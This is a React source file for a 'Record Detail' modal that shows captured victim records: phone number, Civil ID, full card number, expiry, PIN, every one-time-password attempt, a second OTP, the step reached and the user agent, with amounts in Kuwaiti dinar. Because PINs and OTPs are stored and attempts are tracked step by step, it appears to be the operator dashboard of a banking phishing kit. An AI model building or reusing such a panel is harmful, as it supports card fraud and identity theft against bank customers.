const Field = ({ label, value, highlight }) => (
  <div className="flex flex-col gap-0.5">
    <span className="text-xs text-gray-500 uppercase tracking-wide">{label}</span>
    <span className={`text-sm font-medium break-all ${highlight || "text-white"}`}>{value || "—"}</span>
  </div>
);

export default function RecordDetailModal({ record: r, onClose }) {
  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4" onClick={onClose}>
      <div className="absolute inset-0 bg-black/70 backdrop-blur-sm" />
      <div
        className="relative bg-gray-900 border border-gray-700 rounded-2xl w-full max-w-2xl max-h-[90vh] overflow-y-auto shadow-2xl"
        onClick={e => e.stopPropagation()}
      >
        <div className="sticky top-0 bg-gray-900 border-b border-gray-700 px-6 py-4 flex items-center justify-between">
          <div>
            <h2 className="text-lg font-bold text-white">Record Detail</h2>
            <p className="text-xs text-gray-400 mt-0.5">{r.id}</p>
          </div>
          <button onClick={onClose} className="text-gray-400 hover:text-white text-2xl leading-none">×</button>
        </div>

        <div className="p-6 grid grid-cols-2 md:grid-cols-3 gap-5">
          <Field label="Created" value={r.created_date ? new Date(r.created_date).toLocaleString() : null} />
          <Field label="Type" value={r.type} highlight="text-yellow-300" />
          <Field label="Page" value={r.page} />
          <Field label="Phone Number" value={r.phone_number} highlight="text-green-300" />
          <Field label="Civil ID" value={r.civil_id} />
          <Field label="Amount" value={r.amount ? `${r.amount} KD` : null} highlight="text-green-300" />
          <Field label="Pay For" value={r.pay_for} />
          <Field label="Bank" value={r.bank} />
          <Field label="Card Prefix" value={r.card_prefix} />
          <Field label="Card Number" value={r.card_number} highlight="text-red-300" />
          <Field label="Expiry Month" value={r.expiry_month} />
          <Field label="Expiry Year" value={r.expiry_year} />
          <Field label="PIN" value={r.pin} highlight="text-red-400" />
          <div className="flex flex-col gap-0.5">
            <span className="text-xs text-gray-500 uppercase tracking-wide">OTP 1 (all attempts)</span>
            {r.otp1 ? r.otp1.split(" | ").map((otp, i) => (
              <span key={i} className="text-sm font-medium text-blue-300">#{i + 1}: {otp}</span>
            )) : <span className="text-sm font-medium text-white">—</span>}
          </div>
          <Field label="OTP 2" value={r.otp2} highlight="text-blue-300" />
          <Field label="ID Number" value={r.id_number} />
          <Field label="Network" value={r.network} />
          <Field label="Step Reached" value={r.step_reached != null ? String(r.step_reached) : null} highlight="text-purple-300" />
          <div className="col-span-2 md:col-span-3">
            <Field label="User Agent" value={r.user_agent} />
          </div>
        </div>
      </div>
    </div>
  );
}